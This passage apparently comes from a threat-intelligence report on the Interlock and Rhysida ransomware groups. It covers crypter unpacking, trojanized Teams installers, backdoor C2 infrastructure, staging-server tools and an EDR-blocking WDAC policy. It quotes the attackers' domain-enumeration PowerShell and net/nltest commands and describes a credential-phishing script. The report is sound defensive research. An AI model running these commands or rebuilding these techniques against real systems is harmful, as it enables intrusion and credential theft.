Immediately following the header is a 4-byte seed value which will be used to generate the decryption key and IV, followed by the encrypted payload data. Upon execution, the loader stub code starts by using a complex algorithm to generate the 32-byte key and 16-byte IV values from the 4-byte seed value. It then decrypts the payload data using AES-256 in CBC mode.

The loader then proceeds to unpack the sample using standard UPX code, with the missing UPX header values such as decompressed size hardcoded in. The decompression algorithm used is LZMA. The data is unpacked in place, overwriting the packed binary in memory, and the payload’s original PE header is reconstructed. Finally, the payload’s imports are loaded, and it is executed at its entry point.

In the newer version, a first stage was added, which begins by allocating space in memory for the payload and then iterating through a series of long functions which contain junk operations and API hammering interspersed with legitimate **mov** instructions to build the payload up a few bytes at a time.

Once it is complete, the payload in memory is structured as if it were a mapped UPX-packed binary but without any PE header and containing only stripped down UPX metadata. The loader also resolves necessary imports and writes the function pointers into the UPX module before it transfers execution to the entrypoint of the UPX unpacking code. The second stage continues with the UPX-based unpacking mechanism like Tomb v1. Tomb v2 also removed the decryption functionality, relying on decompression and obfuscation only.

Additional techniques are detailed in the analysis completed by [ReversingLabs](https://www.reversinglabs.com/blog/unpacking-pkr_mtsi). Notably, some DLL variants implement the first stage buffer allocation and copying in the DllEntryPoint, which is executed once the Tomb DLL is first loaded. The DLL’s export names match those of the original payload DLL, and each export only contains two function calls:

The first call transfers execution to the UPX-based unpacking function. At the end of the unpacking routine, execution is passed to the DllEntryPoint of the payload DLL. Thus, the loader already supplies the right arguments: the payload DLL’s base address as hinstDLL, fdwReason set to DLL\_PROCESS\_ATTACH and lastly the lpReserved set to zero. Once the payload DLL has been unpacked, and its DllEntryPoint called, the loader is able to directly execute the corresponding export. This mechanism allows the flexible use of crypted DLLs and has been observed on other crypters too. The latest variant of the loader was observed throughout early 2026 and has undergone constant updates to keep detections low.

One of the predominant infection vectors observed for Rhysida and Interlock incidents were trojanized software installers. Victims falling for malicious ads, displayed for instance in search engine results, would be redirected to websites imitating the legitimate download sites of various software installers. To ensure successful downloads and executions, the actors employ code-signing certificates. These fraudulent certificates are sold on cybercrime forums and can be used to sign the final binaries, thus making them seem trustworthy to browsers, operating systems and AV solutions. Reporting malicious certificates through platforms such as [The Cert Graveyard](https://certgraveyard.org/) can impose significant cost on threat actors and help document campaigns for researchers.

In May 2026 Microsoft disrupted a malware-signing-as-a-service (MSaaS) operation tracked as [Fox Tempest](https://www.microsoft.com/us-en/security/blog/2026/05/19/exposing-fox-tempest-a-malware-signing-service-operation/). The publication specifically mentioned Rhysida infection chains described below, attributed to Vanilla Tempest, but also links to Storm-0249, which overlaps with ITG25. However, X-Force cannot assess whether certificates used in Interlock infection chains are tied to Fox Tempest, or another fraudulent code signing service.

In the second half of 2024, trojanized installers were used in initial access campaigns linked to the Interlock group (Hive0163). These samples used code-signing certificates and were identified as their custom JunkFiction downloader. Further samples, using the same certificate and the Hive0163-exclusive JunkFiction loader, indicate that these likely lead to post-exploitation activity via the Supper backdoor:

Signer: “Foshan Yongqiheng Trading Co., Ltd.”

- JunkFiction downloader: b659389cde06f5e01e592dca458fe1be07a302c40dc2a820c7f76d4ee788bad3

- JunkFiction-crypted Supper: 64a0ab00d90682b1807c5d7da1a4ae67cde4c5757fc7d995d8f126f0ec8ae983

In December 2025 an updated version of JunkFiction downloader was used in a campaign masquerading as Microsoft Teams installers downloaded from

- https://leadslaw\[.\]com/MSTeamsSetup.exe

- https://hire-household-squad-postcard.trycloudflare\[.\]com/MSTeamsSetup.exe

After downloading the legitimate installer from the official site, the malicious binaries retrieve and execute a secondary PowerShell script to invoke their malicious behavior. Several samples were signed by “Sichuan Agromax Technology Co., Ltd.”. X-Force was able to link the campaign to Hive0163 with high confidence, as the threat actors were observed manually navigating to the download site to deploy JunkFiction downloader during an Interlock ransomware incident.

In late 2025, trojanized Microsoft Teams installers were used to deploy the Tomb-crypted Endico downloader in infection chains likely leading to Rhysida ransomware. [Microsoft](https://x.com/MsftSecIntel/status/1978592789857251490) publicly attributed the activity to Vanilla Tempest. The malicious installers were delivered through sites imitating authentic download sites such as:

```
https://microsoft-teams[.]icu/files/MSteamsV7.80.exe 
```
The actors made use of code-signing certificates throughout their infection chains, in this case with the signer’s name “LES LOGICIELS SYSTAMEX INC.”.

Thanks to artifacts provided by Deception.Pro on a previously [published](https://blog.deception.pro/blog/oyster-vidar-hok-dec2025) infection chain, X-Force was able to analyze the full execution of the sample including follow-on payloads. The initial Tomb-crypted Endico downloader masquerading as a Microsoft Teams installer downloads the Tomb-crypted Broomstick payload from **scs-techresources\[.\]com** and establishes persistence for it via a scheduled task “AlphaSecurity”. The following Broomstick payloads were observed:

- 0edfad6a8b34b2b419fd254a99394b8f2303d144dbeba7148ef5343e2929fe76

- f34cfdc950124d26b4f2f99b192a4ab7a4163af3143c3b18bc2271ca08d6c899

The Broomstick backdoor establishes a C2 connection with its servers:

- coretether\[.\]com

- nucleusgate\[.\]com

- registrywave\[.\]com

After 3 minutes, the operators deployed a Tomb-crypted Vidar infostealer sample (55a02d14de13134e77eb9cc787ac622791b38b74931d1588bb5750b06951c8c0), a behavior which has been observed in several cases afterwards as well. The sample contains two standard Steam and Telegram dead-drop URLs, which Vidar uses to resolve its centralized C2 infrastructure.

- https://telegram\[.\]me/bul33bt

- https://steamcommunity\[.\]com/profiles/76561198765046918

As the next step, Broomstick operators deployed a Tomb-crypted Supper sample a few minutes later, to facilitate post-exploitation activities. The sample contacted three C2 servers:

- 151.241.99\[.\]169:8080

- 46.183.25\[.\]6:1080

- 213.139.77\[.\]167:4043

The threat actor then ran the following enumeration commands through Supper:

```
powershell.exe -ExecutionPolicy Bypass -Command "$domain=(Get-WmiObject Win32_ComputerSystem).Domain; Write-Output $domain; 
(Get-WmiObject Win32_OperatingSystem).Name; $d=New-Object DirectoryServices.DirectorySearcher; $d.Filter='(&(objectCategory=computer))'; 
$d.SizeLimit=0; Write-Output $d.FindAll().Count; net user $env:USERNAME /domain; 
nltest /trusted_domains; nltest /dclist:$domain" 
net group "domain computers" /domain 
hostname 
```
While maintaining continuous access to the environment, the operators deployed a second Tomb-crypted Supper sample (604f7aa77a14f07baa21e76b73ceb7970037bfbdcc2040bf2e445702e99587a0) with new C2 servers five days later:

- 193.104.58\[.\]42:8080

- 5.226.141\[.\]216:1080

- 178.32.224\[.\]221:4043

Once more, they ran several domain enumeration commands:

```
net user <username> /domain 
systeminfo 
ipconfig 
nltest /dclist:<domain_name> 
net group "domain admins" /domain 
nltest /domain_trusts 
net localgroup administrators 
```
[Expel](https://expel.com/blog/certified-oysterloader-tracking-rhysida-ransomware-gang-activity-via-code-signing-certificates/) reported several code-signing certificates used in campaigns associated with Rhysida operations in late 2025. Notably, there was a certificate used to sign both Broomstick and IceNova (aka Latrodectus, BLACKWIDOW) samples masquerading as legitimate installers.

Signer: “Art en Code B.V.”

- Dave-crypted IceNova: 16474e9e4773fbc1e0b48a5025fad31b7f084b1beffb9a42687b4d01979885fe

- Donut-packed Broomstick: 4e4a3751581252e210f6f45881d778d1f482146f92dc790504bfbcd2bdfa0129

IceNova is a backdoor attributed to ITG25 (IcedID Group). X-Force’s visibility of IceNova samples consistently show it crypted with the [ITG23 Dave crypter](https://www.ibm.com/think/x-force/itg23-crypters-cooperation-between-cybercriminal-groups), starting with the very first samples which reach back to August 2023. A second shared certificate with the signer “SKYSPACE TECHNO SOLUTIONS LLP” was used on two Supper samples within the same timeframe:

- Tomb-crypted Supper: 6190923b28679eb8230010aff9b1d1a4184e8697540cc021a5be38126f3f6d99

- Dave-crypted Supper: 72bed9b26a7747252156b65d24a9a737d70b9bf6aca069c514c1c7b9e04ef9b6

[CERT Polska](https://cert.pl/en/posts/2026/02/fake-captcha-in-action/) reported on a likely related incident from late 2025 involving IceNova and Supper, both crypted with Dave. Shared use of the Supper malware and overlapping certificates within the same initial access campaigns suggest a relationship between former Trickbot/Conti actors (ITG23), IceNova and Rhysida actors, the exact nature of which is still unclear.

Ransomware operators make use of a large variety of different tools to accomplish their objectives during the kill chain until the final ransomware is deployed. X-Force analyzed several payloads discovered on staging servers likely operated by Hive0163. The two servers discussed here are:

- 172.86.68\[.\]175 (nelavohomet\[.\]com)

- 37.27.244\[.\]222 (ms-sql-auth\[.\]com, previously reported by [Amazon threat intelligence](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-teams-identify-interlock-ransomware-campaign-targeting-enterprise-firewalls/)).

The servers contain several different tools, including legitimate software, open-source tooling and custom-developed malware. The broad spectrum within their arsenal marks the group as a sophisticated and highly capable adversary. Though a full analysis of all payloads found on these servers would exceed the scope of this report, the following non-exhaustive list seeks to highlight notable samples.

| Tool | Hash | 
|---|---|
| AZcopy.exe | 5070ad8f45e6ee70e1b8a4fdbf78b2c823ca2c47a817fc29b5042b15880f92d9 | 
| BouncyCastle DLL | 333903c7d22a27098e45fc64b77a264aa220605cfbd3e329c200d7e4b42c881c | 
| NodeJS runtime | 966908e8863bb78cdd66d29f1d425578cdd2035b6045b86fd8418bfde5e34986 | 
| WinPMem, Volatility | 5811d60e80a6051ab3bd2651060fce8f1ea8d446a062625b0d2b55bb7b2bad99 | 
| NTLMThief (JunkFiction-crypted) | dbc316c240067d5495415fca6b8fec28b0d9e41282919d7d124fc645e15f5d4c | 
| PrintNightmare exploit | b204d00dd01da0408978e4101479efbdc977e84ad4a99cdbfd4a3364df964dd0 | 
| [Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/tree/main) (JunkFiction-crypted) | 9422d19bca175bf0727336b6ed5bef01c81e5a80dfdaebf4d7cde9ebfb4ef44e | 
| [Certify](https://github.com/GhostPack/Certify)  | d1caa376cb45b6a1eb3a45c5633c5ef75f7466b8601ed72c8022a8b3f6c1f3be | 
| Advanced Port Scanner 2.5.3869 | d0c1662ce239e4d288048c0e3324ec52962f6ddda77da0cb7af9c1d9c2f1e2eb | 
| [Group Policy Preferences Passwords Recovery Script](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) | a07ddb6d55f122b056d594fd2efaadacdcb2eab6f65e6f0766684773300a7859 | 
| MSSQL Hound | 1192381230fce07ef3f2a86ce746c71f22a7e0b97eea7560a38337844e8f3041 | 
| NTP Timeroasting script | 84d824231a73df2bfb1793d251f69b30fe32bba0693ff6471ac410dedbdd1d9a | 
| Local privilege escalation exploit based on [CVE-2023-36036](https://nvd.nist.gov/vuln/detail/cve-2023-36036) (JunkFiction-crypted) | dc3c1616b70ab3a8b9c25e46fa00f04e18364909ca7ed5b2698f58918e0ccef3 | 
| Local credential stealer (JunkFiction-crypted) | 8e2a3f32479404e195db7dbfd6ae3117122db0fcedccf7fe6abb087763f3ecf2 | 

The actor also relies on RMM tooling for remote access more likely to evade detection, in this case via ConnectWise ScreenConnect clients.

| Hash |  |  |  | Server | 
|---|---|---|---|---|
| 89759f741606e3e9e3004978c08a3d8f5d8a887f13dd749c6a3653d9db9283df |  |  |  | partyglacierhip\[.\]top | 
| ee3e0a9f2b04ebd4badd04e2ce6d4b24a1d0811c1c51e86d147d38919ef8b90f |  |  |  | partyglacierhip\[.\]top | 
| 0708a518ef644a3911a717220706190fbd5e5246c533845887c5fbd967953799 |  |  |  | flowmiceornfidgring\[.\]cc | 

Apart from Hive0163’s large arsenal of known malware families found on the servers (NodeSnake, InterlockRAT and Supper variants discussed above), further backdoors include:

| Malware | Hash |  |  |  |  |  |  | C2 server | 
|---|---|---|---|---|---|---|---|---|
| Sliver | 913487d5c4514300e1f774af965d046479f0a6612061bcb82b536c7427a49102 |  |  |  |  |  |  | 165.245.130\[.\]101 | 
| SystemBC | b7b451db845d2fd97996e765156ab9b0a337f58957803896bef72834d8a4d158 |  |  |  |  |  |  | 67.217.228\[.\]180:443 | 
| SystemBC | 8cc335a675f86c691ae04f31b4098fc5761d4e41abfdcbdf3c1016c9e9440490 |  |  |  |  |  |  | 91.99.97\[.\]247:443 | 
| SystemBC | 47363515fbf02bb669f72adfdc1e52c6cdcb4fc4183832a96b5761b6d95f016c |  |  |  |  |  |  | 144.172.104\[.\]212:443 | 

X-Force also found a custom credential phishing tool (5b7ee3d9f851363d4291689f9ac1a02e18ea024c7ab28009b032a60701639a5d), based on [CredPhish](https://github.com/tokyoneon/CredPhish/tree/master) by Black Hills Infosec. It consists of two PowerShell scripts **first.ps1** (CredPhish), **main1.ps1** and a GIF file. Upon execution, the **main1.ps1** script displays a fake Windows update, before using the CredPhish script to prompt the user for credentials. Depending on the configuration, the credentials are stored in a local file and can be exfiltrated via SMB, DNS or HTTP.

The script discovered on the staging server had an employee’s company domain and username hardcoded to be displayed in the phishing window. Although the employee was shown on the companies’ public website, X-Force did not find it listed as a victim on the Interlock data-leak site.

Another interesting discovery was a ZIP file (c96f1812e0a2d520e6e46e0ec6cd9ba8b5735c57847bea8634b017b7ed8dd8ce) containing a custom created Windows Defender Application Control (WDAC) policy and a certificate. The policies’ file rules explicitly allow executions used by Interlock operators, including:

- Dropbox.exe and GoogleDriveFSSetup.exe

- node.exe and javaw.exe (runtimes for NodeSnake, InterlockRAT and Supper)

- Firefox and Chrome

- PowerShell

- RefreshPolicy.exe

At the same time, the policy denies Smartscreen, Microsoft Defender, and Sophos EDR components.

The first two rules explicitly allow files based on specific attributes. These repeated random words are a typical attribute of JunkFiction loader and downloader executables. The “Tabasco” file is the JunkFiction-crypted [Interlock ransomware binary](https://www.ibm.com/think/x-force/slopoly-start-ai-enhanced-ransomware-attacks#Interlock+ransomware), and was discovered on the same server. In total, the following ransomware binaries were present on the servers:

- b0e292346b4ab3f83fadd8abcce7cfc5b9d50ef73ad141e8bc4a4689fee13504 (JunkFiction-crypted)
- 7389c2d346ef85e469a5ce47ef4cbf55bf3c58075996b8f5596e15fa257d90ad (JunkFiction-crypted)
- aa6e5529831b62cb27211b4918dd6da15ac7e69dbcc8621671dccf6df151c5a2 (JunkFIction-crypted)

Over the past two years, X-Force research indicates a relationship or lineage between Interlock and Rhysida actors. However, the exact nature of this relationship remains unknown. Both groups rely on similar, yet distinct, initial-access campaigns, downloaders, backdoors and preferred crypters - with overlaps in their use of Supper. Code similarities between Supper, and likely Interlock-exclusive malware NodeSnake, InterlockRAT and JunkFiction downloader further support this. The increase of AI-generated malware has driven down the cost of malware development significantly, potentially disrupting the current models of the threat landscape. Less sophisticated threat actors no longer must rely solely on specialized groups, which can blur the lines between facilitators such as initial access brokers, and ransomware operators. The ransomware ecosystem is highly dynamic, and X-Force is continuously tracking the next generation of crypters and the evolution of large cybercriminal groups and their enablers.

This post would not have been possible without the previous research, tracking and analysis by Charlotte Hammond.

A detailed list of indicators of compromise can be found in our [Github repository](https://github.com/XFTI-MalwareThreatResearch/threat-research-blogs/blob/main/interlock-rhysida/IOCs.txt).
